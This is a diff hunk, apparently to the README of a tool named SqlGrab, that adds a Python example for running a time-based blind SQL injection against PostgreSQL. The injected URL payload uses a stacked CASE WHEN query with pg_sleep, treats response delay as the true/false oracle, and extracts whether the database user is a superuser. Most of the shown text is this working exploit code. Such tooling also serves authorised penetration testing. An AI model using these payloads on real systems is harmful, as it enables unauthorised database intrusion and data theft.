@@ -42,3 +42,18 @@ Accept-Language: en-US,en;q=0.9
 
 
 ```
+
+Example usage in code:
+```python
+request = requests.Request(
+  method='GET',
+  url=url + ';SELECT+CASE+WHEN+{payload}+THEN+pg_sleep(1)+END;--'
+)
+grabber = SqlGrab(
+        request=request,
+        dbms='postgresql',
+        condition='response.elapsed.total_seconds() > 1',
+        proxy=args.proxy
+)
+grabber.grab(query='SELECT current_setting($$is_superuser$$)')
+```
